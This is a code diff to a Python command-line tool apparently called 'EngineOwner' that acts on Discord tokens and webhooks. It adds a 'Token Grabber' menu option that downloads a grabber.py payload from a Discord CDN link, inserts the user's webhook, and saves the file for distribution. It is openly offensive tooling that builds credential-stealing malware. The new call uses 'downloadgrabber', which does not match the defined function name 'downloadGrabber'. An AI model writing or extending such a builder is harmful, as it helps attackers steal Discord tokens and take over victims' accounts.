@@ -1,3 +1,4 @@
+import requests
 from os import system
 from colorama import Fore
 from tools.webhook import dwebhook
@@ -35,6 +36,15 @@ ___________              .__                ________
 """
 option = Fore.RED + "     [>] "
 
+def downloadGrabber(webhook):
+    title2 = "EngineOwner ║ Token Grabber"
+    system("title " + title2)
+    url = 'https://cdn.discordapp.com/attachments/1014530090794766482/1014605376471183390/grabber.py'
+    r = requests.get(url, allow_redirects=True)
+    open('output/grabber.py', 'w', encoding='utf-8').write(r.content.decode().replace("WEBHOOK HERE", webhook))
+    print(f"{Fore.RED}\n[ C ] Downloaded Successfully | File in /output/grabber.py\n")
+    input('Press any key to continue')
+
 def owner():
     lmao = input(banner + option)
     if lmao == "17":
@@ -68,4 +78,7 @@ def owner():
     elif lmao == "13":
         token6 = input(Fore.RED + "Token[>] ")
         fucker(token=token6)
+    elif lmao == "9":
+        webhook = input(Fore.RED + "Webhook[>] ")
+        downloadgrabber(webhook=webhook)
 owner()
